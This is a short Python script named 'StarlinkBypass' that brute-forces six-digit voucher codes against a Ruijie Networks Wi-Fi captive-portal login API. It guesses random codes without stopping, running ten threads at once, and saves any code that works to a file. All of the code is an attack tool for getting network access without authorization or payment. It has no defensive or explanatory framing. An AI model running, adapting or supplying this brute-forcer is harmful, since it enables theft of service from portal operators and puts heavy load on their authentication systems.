import requests
import random
import string
import time
from concurrent.futures import ThreadPoolExecutor

class StarlinkBypass:
    def __init__(self):
        self.session = requests.Session()
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json"
        }
        self.api_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"

    def get_session_id(self, portal_url):
        if "sessionId=" in portal_url:
            return portal_url.split("sessionId=")[1].split("&")[0]
        return None

    def generate_voucher(self):
        return ''.join(random.choices(string.digits, k=6))

    def login_voucher(self, voucher, session_id):
        payload = {
            "voucherCode": voucher,
            "sessionId": session_id
        }
        try:
            response = self.session.post(self.api_url, json=payload, headers=self.headers, timeout=10)
            return response.json()
        except Exception:
            return None

    def check_and_save(self, voucher, session_id):
        result = self.login_voucher(voucher, session_id)
        if result and result.get("success"):
            print(f"[!] SUCCESS: {voucher}")
            with open("success.txt", "a") as f:
                f.write(f"{voucher}\n")
            return True
        else:
            # Note: Logging failed attempts might slow down the script significantly
            # with open("failed.txt", "a") as f:
            #     f.write(f"{voucher}\n")
            return False

    def execute_bruteforce(self, session_id, max_workers=10):
        print(f"[+] Starting Bruteforce for Session: {session_id}")
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            while True:
                # Limit task submission rate to prevent memory overflow
                voucher = self.generate_voucher()
                executor.submit(self.check_and_save, voucher, session_id)
                time.sleep(0.01) # Small delay to prevent CPU/RAM spiking

if __name__ == "__main__":
    bot = StarlinkBypass()
    sid = input("Enter Session ID: ")
    if sid:
        bot.execute_bruteforce(sid)
    else:
        print("[!] Session ID is required.")
